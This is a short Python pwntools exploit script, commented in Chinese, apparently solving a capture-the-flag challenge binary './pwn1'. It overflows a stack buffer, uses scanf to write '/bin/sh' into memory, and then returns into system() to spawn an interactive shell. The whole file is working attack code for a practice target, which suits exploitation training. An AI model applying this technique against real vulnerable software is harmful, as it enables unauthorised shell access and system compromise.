#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = process("./pwn1")

elf = ELF('./pwn1')
scanf_addr = p32(elf.symbols['__isoc99_scanf'])	#plt表中scanf函数所在内存地址
system_addr = p32(elf.symbols['system'])		#plt表中system函数所在内存地址
main_addr = p32(0x08048531)		#main函数地址
format_s = p32(0x08048629)		#字符串"%s"所在内存地址
binsh_addr = p32(0x0804a030)	#从内存中找到的可写地址

shellcode1 = 'A'*0x34	#padding
shellcode1 += scanf_addr # 调用scanf以从STDIN读取"/bin/sh"字符串
shellcode1 += main_addr # scanf返回后到main函数
shellcode1 += format_s # scanf参数 
shellcode1 += binsh_addr # "/bin/sh"字符串所在地址

shellcode2 = 'B'*0x2c	#padding
shellcode2 += system_addr #跳转到system函数以执行system("/bin/sh")
shellcode2 += main_addr # system函数返回地址，随便填
shellcode2 += binsh_addr #system函数的参数

print io.read()
io.sendline(shellcode1)
sleep(0.1)					#等待程序执行，防止出错
print io.read()
io.sendline('/bin/sh')
sleep(0.1)					#等待程序执行，防止出错
print io.read()
io.sendline(shellcode2)
sleep(0.1)					#等待程序执行，防止出错
io.interactive()
